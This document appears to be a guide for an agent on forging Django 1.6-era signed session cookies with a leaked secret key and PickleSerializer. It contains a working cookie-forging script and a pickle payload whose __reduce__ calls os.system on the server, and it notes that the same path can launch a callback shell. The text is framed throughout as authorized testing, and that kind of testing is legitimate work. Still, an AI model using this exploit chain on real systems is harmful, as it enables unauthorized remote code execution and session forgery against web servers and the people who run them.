# Legacy Django signed-cookie construction and deserialization

Use this only for a selected authorized application with an established backend, serializer, signing key, cookie name and version. A Django-looking page, an exposed key or a cookie's dotted/base64 appearance alone does not prove pickle execution. Django 1.6 changed its default serializer to JSON; an old Sentry deployment can select PickleSerializer explicitly. Database-backed session IDs are a different contract.

For the 1.6.11 signed-cookie backend, the namespace salt is `django.contrib.sessions.backends.signed_cookies`, the configured serializer controls the payload, and the timestamp is checked against session age during load. Signing is integrity protection, not encryption. A leading dot marks compressed payload, not a different key. Keep the complete timestamp/signature; changing the serialized bytes without resigning is rejected. A leaked effective key can defeat integrity, but JSON serialization does not turn a pickle object into code execution.

## Construct a selected diagnostic cookie

Prepare a fresh private `session.json` containing only the trusted session fields/schema needed for the owned test, and a private key file containing the exact effective key bytes. Do not invent authenticated user fields from a username. If preserving an acquired pickle session is necessary, establish its trust before loading: knowing the signing key does not make unknown pickle data safe for the operator to deserialize. Do not call `signing.loads(...PickleSerializer)` on an unknown cookie merely to inspect it.

Save this reviewed `build_cookie.py` in the private task directory:

~~~python
import json
import sys
from django.core import signing
from django.contrib.sessions.serializers import PickleSerializer

with open(sys.argv[1], 'rb') as source:
    key = source.read()
if not key:
    raise ValueError('empty key')
with open(sys.argv[2], 'rb') as source:
    payload = json.load(source)
if not isinstance(payload, dict):
    raise ValueError('session must be a trusted dictionary')
payload['worker_probe'] = 'owned-session-marker'
cookie = signing.dumps(payload, key=key, serializer=PickleSerializer,
                       salt='django.contrib.sessions.backends.signed_cookies',
                       compress=True)
sys.stdout.write(cookie + '\n')
~~~

Run it with the entrypoint's matching interpreter, exact key file (do not accidentally include a newline) and JSON file. Define `cookie_file` as a fresh private output:

~~~bash
umask 077
"$python2_bin" build_cookie.py "$key_file" "$session_json" > "$cookie_file"
~~~

Check status and a single complete cookie record. Python 2.7's PickleSerializer uses its highest protocol (2); a current interpreter can emit a different protocol even with similar code. This marker remains inert. Apply the generated value to the selected cookie using the authorized browser/session or HTTP client with the actual domain/path rules, then request the specific route that loads the session. Cookie-editor presentation quotes are not universally part of the cookie value. Keep request/result evidence; a generated string or login redirect alone is not proof of accepted session data. Wrong key/salt, changed serializer, stale timestamp, cookie name/path or a payload schema mismatch call for contract diagnosis rather than an unrestricted key/identity guess.

## Authorized pickle execution check

When the selected task expressly tests the established unsafe pickle boundary, replace the inert marker assignment with a controlled object whose reduce callable performs only the agreed server-side effect. For a Linux identity marker at a fresh operator-selected server path, this **illustrative** replacement writes command output on the server when it deserializes the object:

~~~python
import os
import pipes

marker_path = sys.argv[3]
if not marker_path.startswith('/'):
    raise ValueError('need a reviewed absolute server marker path')

class IdentityProbe(object):
    def __reduce__(self):
        return (os.system, ('id > ' + pipes.quote(marker_path),))

payload['worker_probe'] = IdentityProbe()
~~~

Place it before `signing.dumps` in the reviewed builder, and supply the third input path. The local build serializes the callable; it does not invoke `id`. Server unpickling invokes it with the server process's authority, potentially before later validation/error handling. Collect the selected marker through the task's existing authorized access and attribute it to this request. Command return/status, a marker file and an interactive connection establish different effects. A missing marker may reflect rejected signing, no deserialization, wrong namespace/path, permissions or an earlier failure; it does not independently disprove every prerequisite.

The same boundary can start an expressly selected callback command, but requires its specific network/shell capabilities and receiver result; do not infer shell success from cookie acceptance. Authentication as an application administrator does not make the deserializer run as OS root. Finish with the actual process identity/effect and any unresolved request attribution. Clean up only the task's owned marker or session changes through established authorized access.

Verified contracts: [Django 1.6.11 signed-cookie backend](https://github.com/django/django/blob/1.6.11/django/contrib/sessions/backends/signed_cookies.py), [signing](https://github.com/django/django/blob/1.6.11/django/core/signing.py), [serializer](https://github.com/django/django/blob/1.6.11/django/contrib/sessions/serializers.py) and [serialization rationale/default change](https://github.com/django/django/blob/1.6.11/docs/topics/http/sessions.txt).
